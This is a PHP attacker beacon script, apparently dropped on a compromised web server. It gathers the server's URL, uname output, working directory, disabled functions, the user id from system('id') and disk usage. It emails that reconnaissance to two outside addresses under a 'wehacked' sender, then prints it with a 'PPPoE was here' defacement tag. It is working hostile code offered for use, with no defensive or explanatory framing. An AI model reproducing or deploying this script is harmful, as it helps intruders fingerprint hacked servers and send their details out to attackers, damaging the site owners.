<?php
$testmail = "wehacked@you.com";
$SiteEmail = "web2cc@yahoo.com";
$ikpomail = "web4cc@ochikposcrew.org";
$un = @php_uname();
$pwd1 = @getcwd();

$Message = "http://";
$Message .= $_SERVER['HTTP_HOST'];
$Message .= $_SERVER['REQUEST_URI'];
$Message .= "\n";
$Message .= " \n";
$Message .= "Uname: $un \n";
$Message .= "\n";
$Message .= "Dir: $pwd1 \n";
$Message .= "\n";
$Message .= "Disabled Functions: ".showdisablefunctions();
$Message .= "\n";
$Message .= ".............\n";
  function showdisablefunctions() { 
    if ($disablefunc=@ini_get("disable_functions")){ return $disablefunc; } 
    else { return "NONE"; }}

mail("$SiteEmail", "Results", $Message , "From: $testmail");
mail("$ikpomail", "Results", $Message , "From: $testmail");
function ConvertBytes($number) {
    $len = strlen($number);
    if($len < 4) {
        return sprintf("%d b", $number); 
    }
    if($len >= 4 && $len <=6) {
        return sprintf("%0.2f Kb", $number/1024); 
    }
    if($len >= 7 && $len <=9) {
        return sprintf("%0.2f Mb", $number/1024/1024); 
    }
    return sprintf("%0.2f Gb", $number/1024/1024/1024); 
}                          

echo "PPPoE<br>";
$id1 = system(id);
$free1= diskfreespace($pwd1);
$free = ConvertBytes(diskfreespace($pwd1));
if (!$free) {
    $free = 0;
}
$all1= disk_total_space($pwd1);
$all = ConvertBytes(disk_total_space($pwd1));
if (!$all) {
    $all = 0;
}
$used = ConvertBytes($all1-$free1);
$os = @PHP_OS;

echo "PPPoE was here ..<br>";
echo "uname -a: $un<br>";
echo "os: $os<br>";
echo "id: $id1<br>";
echo "free: $free<br>";
echo "used: $used<br>";
echo "total: $all<br>";
exit; 

